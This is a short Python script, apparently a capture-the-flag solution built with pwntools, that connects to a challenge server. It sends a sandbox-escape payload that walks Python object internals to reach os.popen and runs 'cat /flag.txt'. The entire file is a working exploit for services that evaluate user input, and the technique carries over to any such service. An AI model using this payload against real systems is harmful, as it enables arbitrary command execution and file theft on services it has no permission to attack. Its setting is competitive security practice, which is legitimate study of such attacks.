from pwn import *

r = remote("chal.ctf.scint.org", 19001)

_os_warp_idx = 141
payload = f"().__class__.__mro__[1].__subclasses__()[{_os_warp_idx}].__init__.__globals__['popen']('cat /flag.txt').read()"

r.sendlineafter(b">", payload.encode())

print(r.recvline().decode()[1:])

r.close()
